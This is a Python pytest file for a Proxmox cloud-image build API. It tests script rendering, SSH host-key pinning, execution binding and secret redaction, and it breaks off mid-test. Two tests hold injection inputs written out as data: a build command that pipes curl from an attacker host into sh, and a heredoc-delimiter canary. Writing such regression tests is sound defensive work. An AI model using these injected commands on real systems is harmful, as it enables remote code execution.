"""Tests for the Cloud Image Build Pipeline catalog and script rendering."""

from __future__ import annotations

import asyncio
import base64
import hashlib
import json
import logging
import subprocess
from pathlib import Path

import pytest
import yaml
from fastapi import HTTPException
from pydantic import ValidationError

from proxbox_api.app.factory import APIKeyAuthMiddleware
from proxbox_api.database import ProxmoxEndpoint, get_async_session
from proxbox_api.main import app
from proxbox_api.routes.cloud import pipeline_scripts, template_images
from proxbox_api.routes.cloud.catalog import catalog_payload, find_product_version
from proxbox_api.routes.cloud.template_images import build_pipeline_response
from proxbox_api.schemas.cloud_provision import (
    CloudImageBuildProvider,
    CloudImageProductType,
    CloudImageSSHExecutionTarget,
    CloudImageTemplateBuildRequest,
)

PUBLIC_IMAGE_URL = "http://93.184.216.34/cloud.qcow2"


def _execute_route_payload(**overrides: object) -> dict[str, object]:
    payload: dict[str, object] = {
        "product_type": "pfsense",
        "execute": True,
        "target_node": "pve01",
        "ssh_host": "93.184.216.34",
        "image_url": PUBLIC_IMAGE_URL,
    }
    payload.update(overrides)
    return payload


def _fail_if_subprocess_runs(*_args: object, **_kwargs: object) -> None:
    raise AssertionError("cloud image execution must not spawn a subprocess")


class _FakeStdin:
    def __init__(self) -> None:
        self.data = b""

    def write(self, value: bytes) -> None:
        self.data += value

    async def drain(self) -> None:
        return None

    def close(self) -> None:
        return None

    async def wait_closed(self) -> None:
        return None


class _FakeAsyncProcess:
    def __init__(
        self,
        *,
        returncode: int,
        stdout: bytes = b"",
        stderr: bytes = b"",
    ) -> None:
        self._final_returncode = returncode
        self.returncode: int | None = None
        self.stdin = _FakeStdin()
        self.stdout = asyncio.StreamReader()
        self.stdout.feed_data(stdout)
        self.stdout.feed_eof()
        self.stderr = asyncio.StreamReader()
        self.stderr.feed_data(stderr)
        self.stderr.feed_eof()

    async def wait(self) -> int:
        self.returncode = self._final_returncode
        return self._final_returncode

    def terminate(self) -> None:
        self.returncode = -15

    def kill(self) -> None:
        self.returncode = -9


def _bound_endpoint(**overrides: object) -> ProxmoxEndpoint:
    values: dict[str, object] = {
        "id": 77,
        "name": "pve-bound",
        "ip_address": "93.184.216.34",
        "username": "root@pam",
        "enabled": True,
        "allow_writes": True,
        "access_methods": "api_ssh",
        "ssh_target_node": "pve01",
        "ssh_host": "93.184.216.34",
        "ssh_username": "root",
        "ssh_port": 22,
        "ssh_identity_file": "/etc/proxbox/ssh_keys/id_ed25519",
        "ssh_known_host_fingerprint": ("SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"),
    }
    values.update(overrides)
    return ProxmoxEndpoint(**values)


async def _post_json(
    path: str,
    payload: dict[str, object],
    *,
    api_key: str,
    include_auth: bool = True,
) -> tuple[int, dict[str, object], str]:
    """Dispatch one real ASGI HTTP request without the deprecated HTTPX adapter."""

    encoded = json.dumps(payload).encode()
    request_sent = False
    messages: list[dict[str, object]] = []

    async def receive() -> dict[str, object]:
        nonlocal request_sent
        if not request_sent:
            request_sent = True
            return {"type": "http.request", "body": encoded, "more_body": False}
        return {"type": "http.disconnect"}

    async def send(message: dict[str, object]) -> None:
        messages.append(message)

    scope: dict[str, object] = {
        "type": "http",
        "asgi": {"version": "3.0", "spec_version": "2.3"},
        "http_version": "1.1",
        "method": "POST",
        "scheme": "http",
        "path": path,
        "raw_path": path.encode(),
        "query_string": b"",
        "root_path": "",
        "headers": [
            (b"content-type", b"application/json"),
            (b"content-length", str(len(encoded)).encode()),
            (b"x-proxbox-api-key", api_key.encode()),
        ],
        "client": ("127.0.0.1", 12345),
        "server": ("testserver", 80),
        "state": {},
        "app": app,
    }
    inner_app = app.middleware_stack or app.build_middleware_stack()
    while type(inner_app).__name__ != "ExceptionMiddleware":
        inner_app = inner_app.app
    http_app = APIKeyAuthMiddleware(inner_app) if include_auth else inner_app
    await asyncio.wait_for(http_app(scope, receive, send), timeout=5)

    response_start = next(
        message for message in messages if message["type"] == "http.response.start"
    )
    status_code = int(response_start["status"])
    body = b"".join(
        message.get("body", b"") for message in messages if message["type"] == "http.response.body"
    )
    text = body.decode()
    parsed = json.loads(text)
    assert isinstance(parsed, dict)
    return status_code, parsed, text


@pytest.fixture
def proxbox_caplog(caplog: pytest.LogCaptureFixture):
    """Capture the non-propagating application logger for secret canaries."""

    proxbox_logger = logging.getLogger("proxbox")
    proxbox_logger.addHandler(caplog.handler)
    try:
        yield caplog
    finally:
        proxbox_logger.removeHandler(caplog.handler)


@pytest.fixture
def inline_auth_thread(monkeypatch: pytest.MonkeyPatch) -> None:
    """Keep the auth middleware deterministic under the unit-test event loop."""

    async def inline(func, /, *args: object, **kwargs: object) -> object:
        return func(*args, **kwargs)

    monkeypatch.setattr(asyncio, "to_thread", inline)


@pytest.fixture
def sync_route_session(db_session, client_with_fake_netbox):
    """Use the route's supported sync-session compatibility seam in ASGI tests."""

    previous = app.dependency_overrides.get(get_async_session)

    async def override():
        yield db_session

    app.dependency_overrides[get_async_session] = override
    try:
        yield db_session
    finally:
        if previous is None:
            app.dependency_overrides.pop(get_async_session, None)
        else:
            app.dependency_overrides[get_async_session] = previous


def test_catalog_exposes_firewall_appliance_products():
    catalog = catalog_payload()

    assert "pfsense" in catalog
    assert "opnsense" in catalog
    assert catalog["pfsense"][0]["default_provider"] == "release_image"
    assert "source_tree" in catalog["opnsense"][0]["supported_providers"]


def test_pve_catalog_selects_proxmox_iso_provider():
    catalog = catalog_payload()
    entry = find_product_version(CloudImageProductType.PVE, "9.1.11")

    assert catalog["pve"][0]["default_provider"] == "proxmox_iso"
    assert catalog["pve"][0]["supported_providers"] == ["proxmox_iso"]
    assert entry.default_provider == CloudImageBuildProvider.PROXMOX_ISO
    assert CloudImageBuildProvider.DEBIAN_CLOUD_IMAGE not in entry.supported_providers
    assert entry.image_url is not None
    assert entry.image_url.endswith(".iso")
    assert "cloud.debian.org" not in entry.image_url


def test_find_product_version_defaults_to_first_entry():
    entry = find_product_version(CloudImageProductType.PFSENSE)

    assert entry.product_type == CloudImageProductType.PFSENSE
    assert entry.version == "2.8.1"


def test_pbs_catalog_defaults_to_current_trixie_entry():
    entry = find_product_version(CloudImageProductType.PBS)

    assert entry.product_type == CloudImageProductType.PBS
    assert entry.version == "4.2"
    assert entry.debian_codename == "trixie"
    assert entry.image_url is not None
    assert "debian-13-genericcloud-amd64.qcow2" in entry.image_url


def test_pbs_cloud_image_pipeline_bakes_dns_qga_and_zabbix_userdata():
    response = build_pipeline_response(
        CloudImageTemplateBuildRequest(
            product_type=CloudImageProductType.PBS,
            product_version="4.2",
            provider=CloudImageBuildProvider.DEBIAN_CLOUD_IMAGE,
            vmid=9400,
            name="pbs42-template",
            hostname="pbs42-template",
            domain="nmulti.cloud",
            search_domain="nmulti.cloud",
            nameservers=["168.0.96.26", "168.0.96.27", "8.8.8.8"],
            execute=False,
            include_sensitive_preview=True,
        )
    )

    assert response.status == "planned"
    assert response.sensitive_preview is not None
    userdata = response.sensitive_preview.generated_userdata
    assert userdata is not None
    parsed = yaml.safe_load(userdata)
    assert parsed["resolv_conf"]["nameservers"] == [
        "168.0.96.26",
        "168.0.96.27",
        "8.8.8.8",
    ]
    assert parsed["resolv_conf"]["searchdomains"] == ["nmulti.cloud"]
    assert "debian/pbs trixie pbs-no-subscription" in userdata
    assert "zabbix-release_latest_7.4+debian13_all.deb" in userdata
    assert (
        "DEBIAN_FRONTEND=noninteractive apt-get install -y "
        "proxmox-backup-server qemu-guest-agent zabbix-agent2"
    ) in userdata
    assert "Server=zabbix.nmulti.cloud" in userdata
    assert "systemctl enable qemu-guest-agent" in userdata
    assert "systemctl enable zabbix-agent2" in userdata
    assert (
        "user=local:snippets/pbs42-template-pbs-4.2-user-data.yml"
        in response.sensitive_preview.build_script
    )
    assert "--cicustom" in response.sensitive_preview.build_script


def test_pbs_cloud_image_pipeline_can_disable_default_agents():
    response = build_pipeline_response(
        CloudImageTemplateBuildRequest(
            product_type=CloudImageProductType.PBS,
            product_version="4.2",
            provider=CloudImageBuildProvider.DEBIAN_CLOUD_IMAGE,
            vmid=9401,
            name="pbs42-minimal",
            install_qemu_guest_agent=False,
            install_zabbix_agent2=False,
            execute=False,
            include_sensitive_preview=True,
        )
    )

    assert response.sensitive_preview is not None
    assert response.sensitive_preview.generated_userdata is not None
    assert "qemu-guest-agent" not in response.sensitive_preview.generated_userdata
    assert "zabbix-agent2" not in response.sensitive_preview.generated_userdata
    assert "zabbix-release_latest_7.4" not in response.sensitive_preview.generated_userdata


def test_pfsense_release_pipeline_returns_first_boot_script_and_qm_commands():
    response = build_pipeline_response(
        CloudImageTemplateBuildRequest(
            product_type=CloudImageProductType.PFSENSE,
            product_version="2.8.1",
            provider=CloudImageBuildProvider.RELEASE_IMAGE,
            vmid=9100,
            name="pfsense-template",
            hostname="pfsense-template",
            execute=False,
            include_sensitive_preview=True,
        )
    )

    assert response.pipeline_name == "Cloud Image Build Pipeline"
    assert response.status == "planned"
    assert response.sensitive_preview is not None
    assert response.sensitive_preview.first_boot_script is not None
    expected_environment = (
        'PIPELINE_NAME="Cloud Image Build Pipeline"\n'
        'PRODUCT="pfsense"\n'
        'PRODUCT_VERSION="2.8.1"\n'
        'HOSTNAME="pfsense-template"\n'
        'DOMAIN="nmulti.local"\n'
        'NODE_CIDR=""\n'
        'GATEWAY=""\n'
        'NAMESERVERS="1.1.1.1 8.8.8.8"\n'
    )
    assert 'PRODUCT="pfsense"' not in response.sensitive_preview.first_boot_script
    assert (
        base64.b64encode(expected_environment.encode()).decode()
        in response.sensitive_preview.first_boot_script
    )
    assert 'PRODUCT="pfsense"' not in response.sensitive_preview.build_script
    assert (
        base64.b64encode(response.sensitive_preview.first_boot_script.encode()).decode()
        in response.sensitive_preview.build_script
    )
    assert response.sensitive_preview.image_url is not None
    assert "pfSense-CE" in response.sensitive_preview.image_url
    assert "qm create 9100" in response.sensitive_preview.build_script
    assert "qm set 9100 --serial0 socket --vga serial0" in response.sensitive_preview.build_script
    assert "qm set 9100 --agent enabled=1" in response.sensitive_preview.build_script
    assert "qm template 9100" in response.sensitive_preview.build_script


def test_pve_rejects_debian_cloud_image_provider_fast():
    with pytest.raises(ValidationError) as exc:
        CloudImageTemplateBuildRequest(
            product_type=CloudImageProductType.PVE,
            product_version="9.1.11",
            provider=CloudImageBuildProvider.DEBIAN_CLOUD_IMAGE,
            vmid=9300,
            name="pve-template",
        )

    assert "PVE products must use provider=proxmox_iso" in str(exc.value)


def test_pve_iso_pipeline_uses_graphical_display_and_catalog_iso():
    response = build_pipeline_response(
        CloudImageTemplateBuildRequest(
            product_type=CloudImageProductType.PVE,
            product_version="9.1.11",
            provider=CloudImageBuildProvider.PROXMOX_ISO,
            vmid=9300,
            name="pve-template",
            execute=False,
            include_sensitive_preview=True,
        )
    )

    assert response.provider == CloudImageBuildProvider.PROXMOX_ISO
    assert response.sensitive_preview is not None
    assert response.sensitive_preview.generated_userdata is None
    assert response.sensitive_preview.image_url is not None
    assert response.sensitive_preview.image_url.endswith(".iso")
    assert "cloud.debian.org" not in response.sensitive_preview.image_url
    assert "qm set 9300 --ide2 local:iso/" in response.sensitive_preview.build_script
    assert "qm set 9300 --vga std" in response.sensitive_preview.build_script
    assert "--serial0 socket --vga serial0" not in response.sensitive_preview.build_script
    assert "--vga serial0" not in response.sensitive_preview.build_script


def test_pve_iso_pipeline_uses_distinct_iso_and_vm_storage_roles() -> None:
    response = build_pipeline_response(
        CloudImageTemplateBuildRequest(
            product_type=CloudImageProductType.PVE,
            product_version="9.1.11",
            provider=CloudImageBuildProvider.PROXMOX_ISO,
            vmid=9301,
            name="pve-storage-contract",
            image_storage="iso-library",
            vm_storage="vm-images",
            snippets_storage="unused-snippets",
            execute=False,
            include_sensitive_preview=True,
        )
    )

    assert response.sensitive_preview is not None
    script = response.sensitive_preview.build_script
    assert "ISO_PATH=$(pvesm path iso-library:iso/" in script
    assert "/var/lib/vz/template/iso" not in script
    assert "--scsi0 vm-images:0" in script
    assert "--ide2 iso-library:iso/" in script
    assert "unused-snippets" not in script


def test_opnsense_source_tree_pipeline_uses_catalog_source_path():
    response = build_pipeline_response(
        CloudImageTemplateBuildRequest(
            product_type=CloudImageProductType.OPNSENSE,
            product_version="26.1.8",
            provider=CloudImageBuildProvider.SOURCE_TREE,
            vmid=9200,
            name="opnsense-template",
            execute=False,
            include_sensitive_preview=True,
        )
    )

    assert response.sensitive_preview is not None
    assert response.sensitive_preview.source_tree_path == "/opt/proxbox/image-sources/opnsense"
    assert response.sensitive_preview.source_artifact_path == (
        "/opt/proxbox/image-sources/opnsense/artifacts/opnsense-dvd.img"
    )
    assert 'cd -- "$SOURCE_ROOT"' in response.sensitive_preview.build_script
    assert "/usr/local/libexec/proxbox/build-opnsense-dvd" in (
        response.sensitive_preview.build_script
    )
    assert "realpath -e" in response.sensitive_preview.build_script
    assert "mktemp -d /var/tmp/proxbox-cloud-image-9200.XXXXXX" in (
        response.sensitive_preview.build_script
    )


def test_source_tree_build_command_rejects_caller_shell_source() -> None:
    with pytest.raises(ValidationError):
        CloudImageTemplateBuildRequest(
            product_type=CloudImageProductType.OPNSENSE,
            provider=CloudImageBuildProvider.SOURCE_TREE,
            source_build_command="make dvd; curl http://attacker.invalid | sh",
        )

    with pytest.raises(ValidationError, match="not compatible"):
        CloudImageTemplateBuildRequest(
            product_type=CloudImageProductType.PFSENSE,
            provider=CloudImageBuildProvider.SOURCE_TREE,
            source_build_command="opnsense_dvd",
        )


@pytest.mark.parametrize(
    ("field", "value", "code"),
    [
        ("source_tree_path", "/tmp/attacker-controlled", "source_root_assertion_mismatch"),
        (
            "source_artifact_path",
            "/tmp/attacker-controlled/disk.qcow2",
            "source_artifact_assertion_mismatch",
        ),
    ],
)
def test_source_tree_paths_are_assertions_not_execution_authority(
    field: str,
    value: str,
    code: str,
) -> None:
    with pytest.raises(HTTPException) as exc:
        build_pipeline_response(
            CloudImageTemplateBuildRequest(
                product_type=CloudImageProductType.OPNSENSE,
                product_version="26.1.8",
                provider=CloudImageBuildProvider.SOURCE_TREE,
                execute=False,
                **{field: value},
            )
        )

    assert exc.value.status_code == 409
    assert exc.value.detail["code"] == code


def test_pipeline_omitted_storage_preserves_legacy_local_lvm_destination() -> None:
    response = build_pipeline_response(
        CloudImageTemplateBuildRequest(
            product_type=CloudImageProductType.PFSENSE,
            vmid=9102,
            execute=False,
            include_sensitive_preview=True,
        )
    )

    assert response.sensitive_preview is not None
    script = response.sensitive_preview.build_script
    assert "qm importdisk 9102" in script
    assert " local-lvm\n" in script
    assert "--ide2 local-lvm:cloudinit" in script


def test_pipeline_explicit_vm_storage_remains_authoritative() -> None:
    response = build_pipeline_response(
        CloudImageTemplateBuildRequest(
            product_type=CloudImageProductType.PFSENSE,
            vmid=9103,
            vm_storage="explicit-images",
            execute=False,
            include_sensitive_preview=True,
        )
    )

    assert response.sensitive_preview is not None
    script = response.sensitive_preview.build_script
    assert "qm importdisk 9103" in script
    assert " explicit-images\n" in script
    assert "--ide2 explicit-images:cloudinit" in script


def test_pipeline_rejects_custom_snippet_directory_mapping() -> None:
    with pytest.raises(ValidationError, match="Custom snippets_dir mappings are unsupported"):
        CloudImageTemplateBuildRequest(snippets_dir="/srv/pve/snippets")


@pytest.mark.parametrize(
    "build_request",
    [
        CloudImageTemplateBuildRequest(
            product_type=CloudImageProductType.PFSENSE,
            execute=False,
            include_sensitive_preview=True,
        ),
        CloudImageTemplateBuildRequest(
            product_type=CloudImageProductType.OPNSENSE,
            provider=CloudImageBuildProvider.SOURCE_TREE,
            execute=False,
            include_sensitive_preview=True,
        ),
        CloudImageTemplateBuildRequest(
            product_type=CloudImageProductType.PVE,
            provider=CloudImageBuildProvider.PROXMOX_ISO,
            execute=False,
            include_sensitive_preview=True,
        ),
    ],
)
def test_generated_provider_scripts_parse_as_bash(
    build_request: CloudImageTemplateBuildRequest,
) -> None:
    response = build_pipeline_response(build_request)

    assert response.sensitive_preview is not None
    syntax = subprocess.run(
        ["bash", "-n"],
        input=response.sensitive_preview.build_script,
        text=True,
        capture_output=True,
        check=False,
        timeout=10,
    )
    assert syntax.returncode == 0, syntax.stderr


def test_user_data_yaml_bakes_cicustom_snippet_without_catalog_product():
    """A verbatim user_data_yaml build skips the catalog and writes a cicustom user snippet."""
    custom = "#cloud-config\nruncmd:\n  - echo zabbix-bootstrap\n"
    response = build_pipeline_response(
        CloudImageTemplateBuildRequest(
            name="zabbix-7.4-ubuntu-2604",
            vmid=9010,
            image_url=PUBLIC_IMAGE_URL,
            image_storage="local",
            vm_storage="local",
            storage="local",
            snippets_storage="snippet-store",
            user_data_yaml=custom,
            execute=False,
            include_sensitive_preview=True,
        )
    )

    assert response.status == "planned"
    assert response.sensitive_preview is not None
    assert response.sensitive_preview.generated_userdata == custom
    # The cloud-config is materialised as a cicustom *user* snippet (so it runs at
    # first boot) through a delimiter-proof encoded write.
    script = response.sensitive_preview.build_script
    assert "EOF_USER_DATA" not in script
    assert "echo zabbix-bootstrap" not in script
    assert base64.b64encode(custom.encode()).decode() in script
    assert "USER_SNIPPET_PATH=$(pvesm path snippet-store:snippets/" in script
    assert "--cicustom" in script
    assert "user=snippet-store:snippets/" in script
    assert "qm set 9010 --agent enabled=1" in script
    assert "qm template 9010" in script


def test_user_data_delimiter_payload_never_becomes_shell_source() -> None:
    canary = "EOF_USER_DATA\nprintf 'owned' >/tmp/proxbox-owned\n"
    custom = f"#cloud-config\nruncmd:\n  - {canary}"
    response = build_pipeline_response(
        CloudImageTemplateBuildRequest(
            name="delimiter-regression",
            vmid=9011,
            image_url=PUBLIC_IMAGE_URL,
            user_data_yaml=custom,
            execute=False,
            include_sensitive_preview=True,
        )
    )

    assert response.sensitive_preview is not None
    script = response.sensitive_preview.build_script
    assert canary not in script
    assert "EOF_USER_DATA" not in script
    assert base64.b64encode(custom.encode()).decode() in script
    syntax = subprocess.run(
        ["bash", "-n"],
        input=script,
        text=True,
        capture_output=True,
        check=False,
        timeout=10,
    )
    assert syntax.returncode == 0, syntax.stderr


def test_execute_requires_environment_opt_in():
    with pytest.raises(HTTPException) as exc:
        build_pipeline_response(
            CloudImageTemplateBuildRequest(
                product_type=CloudImageProductType.PFSENSE,
                execute=True,
                ssh_host="pve.example.test",
            )
        )

    assert exc.value.status_code == 409
    assert exc.value.detail["code"] == "bound_async_execution_required"


def test_execution_target_is_derived_from_complete_persisted_binding() -> None:
    endpoint = _bound_endpoint()
    request = CloudImageTemplateBuildRequest(
        endpoint_id=endpoint.id,
        target_node="pve01",
        execute=True,
        product_type="pfsense",
    )

    target = template_images._resolve_execution_ssh_target(endpoint, request)

    assert target.model_dump() == {
        "host": "93.184.216.34",
        "user": "root",
        "port": 22,
        "identity_file": "/etc/proxbox/ssh_keys/id_ed25519",
        "known_host_fingerprint": "SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    }


@pytest.mark.asyncio
async def test_persisted_fingerprint_pins_exact_scanned_host_key(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    key_data = b"proxbox-packer-test-host-key"
    key_b64 = base64.b64encode(key_data).decode()
    digest = base64.b64encode(hashlib.sha256(key_data).digest()).decode().rstrip("=")
    target = CloudImageSSHExecutionTarget(
        host="93.184.216.34",
        user="root",
        port=22,
        identity_file="/etc/proxbox/ssh_keys/id_ed25519",
        known_host_fingerprint=f"SHA256:{digest}",
    )

    async def fake_exec(*args: str, **_kwargs: object) -> _FakeAsyncProcess:
        assert args[0] == "/usr/bin/ssh-keyscan"
        return _FakeAsyncProcess(
            returncode=0,
            stdout=f"93.184.216.34 ssh-ed25519 {key_b64}\n".encode(),
        )

    monkeypatch.setattr(pipeline_scripts.asyncio, "create_subprocess_exec", fake_exec)

    known_hosts = await pipeline_scripts._pinned_known_hosts_file(target)
    try:
        assert known_hosts.read_text() == f"93.184.216.34 ssh-ed25519 {key_b64}\n"
    finally:
        known_hosts.unlink(missing_ok=True)


@pytest.mark.asyncio
async def test_oversized_host_key_scan_output_stops_scanner(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    class TrackedProcess(_FakeAsyncProcess):
        def __init__(self) -> None:
            super().__init__(returncode=0, stdout=b"x" * 65537)
            self.terminated = False

        def terminate(self) -> None:
            self.terminated = True
            super().terminate()

    process = TrackedProcess()

    async def fake_exec(*_args: str, **_kwargs: object) -> _FakeAsyncProcess:
        return process

    monkeypatch.setattr(pipeline_scripts.asyncio, "create_subprocess_exec", fake_exec)
    target = CloudImageSSHExecutionTarget(
        host="93.184.216.34",
        user="root",
        port=22,
        identity_file="/etc/proxbox/ssh_keys/id_ed25519",
        known_host_fingerprint="SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    )

    with pytest.raises(pipeline_scripts._SSHHostKeyVerificationError):
        await pipeline_scripts._pinned_known_hosts_file(target)

    assert process.terminated is True


@pytest.mark.asyncio
async def test_remote_execution_ssh_argv_ignores_ambient_config_and_proxies(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    known_hosts = tmp_path / "known_hosts"
    known_hosts.write_text("pinned\n")
    target = CloudImageSSHExecutionTarget(
        host="93.184.216.34",
        user="root",
        port=2222,
        identity_file="/etc/proxbox/ssh_keys/id_ed25519",
        known_host_fingerprint="SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    )
    captured: list[list[str]] = []
    processes: list[_FakeAsyncProcess] = []

    async def fake_pin(_target: object) -> Path:
        return known_hosts

    async def fake_exec(*args: str, **_kwargs: object) -> _FakeAsyncProcess:
        captured.append(list(args))
        process = _FakeAsyncProcess(
            returncode=0,
            stdout=b"first\nsecond\n",
            stderr=b"warning-without-newline",
        )
        processes.append(process)
        return process

    monkeypatch.setattr(pipeline_scripts, "_pinned_known_hosts_file", fake_pin)
    monkeypatch.setattr(pipeline_scripts.asyncio, "create_subprocess_exec", fake_exec)

    (
        status,
        returncode,
        summary,
        findings,
        error_code,
    ) = await pipeline_scripts._pipeline_execution_result(
        CloudImageTemplateBuildRequest(product_type="pfsense", execute=True),
        "set -eu\ntrue\n",
        execution_allowed=True,
        execution_target=target,
        remote_unit="proxbox-cloud-image-00000000-0000-0000-0000-000000000001",
    )

    assert status == "verification_pending"
    assert returncode == 0
    assert error_code is None
    assert findings[0].code == "execution_awaiting_verification"
    assert summary.stdout_bytes == len(b"first\nsecond\n")
    assert summary.stdout_lines == 2
    assert summary.stderr_lines == 1
    assert processes[0].stdin.data == b"set -eu\ntrue\n"
    assert captured == [
        [
            "/usr/bin/ssh",
            "-F",
            "none",
            "-o",
            "BatchMode=yes",
            "-o",
            "IdentitiesOnly=yes",
            "-o",
            "StrictHostKeyChecking=yes",
            "-o",
            f"UserKnownHostsFile={known_hosts}",
            "-o",
            "GlobalKnownHostsFile=/dev/null",
            "-o",
            "ProxyCommand=none",
            "-o",
            "ProxyJump=none",
            "-o",
            "CanonicalizeHostname=no",
            "-p",
            "2222",
            "-i",
            "/etc/proxbox/ssh_keys/id_ed25519",
            "root@93.184.216.34",
            "/usr/bin/systemd-run",
            "--quiet",
            "--wait",
            "--pipe",
            "--collect",
            "--unit",
            "proxbox-cloud-image-00000000-0000-0000-0000-000000000001",
            "/bin/bash",
            "-s",
        ]
    ]


@pytest.mark.asyncio
async def test_fingerprint_mismatch_stops_before_ssh_execution(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    key_b64 = base64.b64encode(b"different-key").decode()
    calls: list[list[str]] = []

    async def fake_exec(*args: str, **_kwargs: object) -> _FakeAsyncProcess:
        calls.append(list(args))
        return _FakeAsyncProcess(
            returncode=0,
            stdout=f"93.184.216.34 ssh-ed25519 {key_b64}\n".encode(),
        )

    monkeypatch.setattr(pipeline_scripts.asyncio, "create_subprocess_exec", fake_exec)
    target = CloudImageSSHExecutionTarget(
        host="93.184.216.34",
        user="root",
        port=22,
        identity_file="/etc/proxbox/ssh_keys/id_ed25519",
        known_host_fingerprint="SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    )

    (
        status,
        returncode,
        summary,
        findings,
        error_code,
    ) = await pipeline_scripts._pipeline_execution_result(
        CloudImageTemplateBuildRequest(product_type="pfsense", execute=True),
        "true\n",
        execution_allowed=True,
        execution_target=target,
        remote_unit="proxbox-cloud-image-00000000-0000-0000-0000-000000000001",
    )

    assert status == "failed"
    assert returncode is None
    assert summary.attempted is True
    assert findings[0].code == "ssh_host_key_unverified"
    assert error_code == "ssh_host_key_unverified"
    assert calls == [["/usr/bin/ssh-keyscan", "-T", "10", "-p", "22", "93.184.216.34"]]


@pytest.mark.asyncio
async def test_task_cancellation_stops_local_process_and_remote_unit(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    known_hosts = tmp_path / "known_hosts"
    target = CloudImageSSHExecutionTarget(
        host="93.184.216.34",
        user="root",
        port=22,
        identity_file="/etc/proxbox/ssh_keys/id_ed25519",
        known_host_fingerprint="SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    )
    remote_unit = "proxbox-cloud-image-00000000-0000-0000-0000-000000000001"

    class BlockingProcess(_FakeAsyncProcess):
        def __init__(self) -> None:
            super().__init__(returncode=0)
            self.stopped = asyncio.Event()

        async def wait(self) -> int:
            await self.stopped.wait()
            return int(self.returncode or 0)

        def terminate(self) -> None:
            self.returncode = -15
            self.stopped.set()

    main_process = BlockingProcess()
    spawned: list[list[str]] = []

    async def fake_pin(_target: object) -> Path:
        return known_hosts

    async def fake_exec(*args: str, **_kwargs: object) -> _FakeAsyncProcess:
        spawned.append(list(args))
        if len(spawned) == 1:
            return main_process
        return _FakeAsyncProcess(returncode=0)

    monkeypatch.setattr(pipeline_scripts, "_pinned_known_hosts_file", fake_pin)
    monkeypatch.setattr(pipeline_scripts.asyncio, "create_subprocess_exec", fake_exec)
    task = asyncio.create_task(
        pipeline_scripts._pipeline_execution_result(
            CloudImageTemplateBuildRequest(product_type="pfsense", execute=True),
            "true\n",
            execution_allowed=True,
            execution_target=target,
            remote_unit=remote_unit,
        )
    )
    await asyncio.sleep(0)
    task.cancel()

    with pytest.raises(pipeline_scripts.PipelineExecutionCancelled) as exc:
        await task

    assert exc.value.execution.cancellation_attempted is True
    assert exc.value.execution.cancellation_succeeded is True
    assert main_process.returncode == -15
    assert spawned[1][-3:] == ["/usr/bin/systemctl", "stop", remote_unit]


@pytest.mark.parametrize(
    ("request_override", "value", "expected_code"),
    [
        ("ssh_host", "93.184.216.35", "endpoint_ssh_binding_mismatch"),
        (
            "ssh_identity_file",
            "/etc/proxbox/ssh_keys/different_ed25519",
            "endpoint_ssh_binding_mismatch",
        ),
        (
            "ssh_known_host_fingerprint",
            "SHA256:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB",
            "endpoint_ssh_binding_mismatch",
        ),
    ],
)
def test_execution_rejects_caller_ssh_binding_mismatch(
    request_override: str,
    value: object,
    expected_code: str,
) -> None:
    endpoint = _bound_endpoint()
    request = CloudImageTemplateBuildRequest(
        endpoint_id=endpoint.id,
        target_node="pve01",
        execute=True,
        product_type="pfsense",
        **{request_override: value},
    )

    with pytest.raises(HTTPException) as exc:
        template_images._resolve_execution_ssh_target(endpoint, request)

    assert exc.value.status_code == 409
    assert exc.value.detail["code"] == expected_code
    assert exc.value.detail["field"] == request_override


@pytest.mark.parametrize(
    ("endpoint_override", "request_node", "expected_code"),
    [
        ({"enabled": False}, "pve01", "endpoint_disabled"),
        ({"ssh_identity_file": None}, "pve01", "endpoint_ssh_binding_incomplete"),
        ({}, "pve02", "endpoint_node_mismatch"),
    ],
)
def test_execution_rejects_disabled_incomplete_or_wrong_node_binding(
    endpoint_override: dict[str, object],
    request_node: str,
    expected_code: str,
) -> None:
    endpoint = _bound_endpoint(**endpoint_override)
    request = CloudImageTemplateBuildRequest(
        endpoint_id=endpoint.id,
        target_node=request_node,
        execute=True,
        product_type="pfsense",
    )

    with pytest.raises(HTTPException) as exc:
        template_images._resolve_execution_ssh_target(endpoint, request)

    assert exc.value.detail["code"] == expected_code


@pytest.mark.asyncio
async def test_execute_route_requires_authentication_before_subprocess(
    client_with_fake_netbox,
    inline_auth_thread,
    monkeypatch,
):
    monkeypatch.setenv("PROXBOX_ENABLE_CLOUD_IMAGE_EXECUTION", "true")
    monkeypatch.setattr(
        "proxbox_api.routes.cloud.pipeline_scripts.asyncio.create_subprocess_exec",
        _fail_if_subprocess_runs,
    )

    status_code, _payload, _text = await _post_json(
        "/cloud/templates/images",
        _execute_route_payload(),
        api_key="",
    )

    assert status_code == 401


@pytest.mark.asyncio
async def test_request_validation_response_never_reflects_secret_input() -> None:
    userdata_secret = "PACKER-USERDATA-PASSWORD-SECRET"
    signed_url_secret = "PACKER-SIGNED-URL-SECRET"

    status_code, payload, text = await _post_json(
        "/cloud/templates/images",
        {
            "product_type": "pfsense",
            "execute": True,
            "include_sensitive_preview": True,
            "image_url": f"{PUBLIC_IMAGE_URL}?sig={signed_url_secret}",
            "user_data_yaml": f"#cloud-config\npassword: {userdata_secret}\n",
        },
        api_key="",
        include_auth=False,
    )

    assert status_code == 422
    assert payload == {
        "detail": [
            {
                "type": "request_validation_error",
                "loc": ["body"],
                "msg": "Request validation failed.",
            }
        ]
    }
    assert '"input"' not in text
    assert userdata_secret not in text
    assert signed_url_secret not in text


@pytest.mark.asyncio
async def test_execute_route_requires_endpoint_id_before_subprocess(
    sync_route_session,
    monkeypatch,
):
    monkeypatch.setenv("PROXBOX_ENABLE_CLOUD_IMAGE_EXECUTION", "true")
    monkeypatch.setattr(
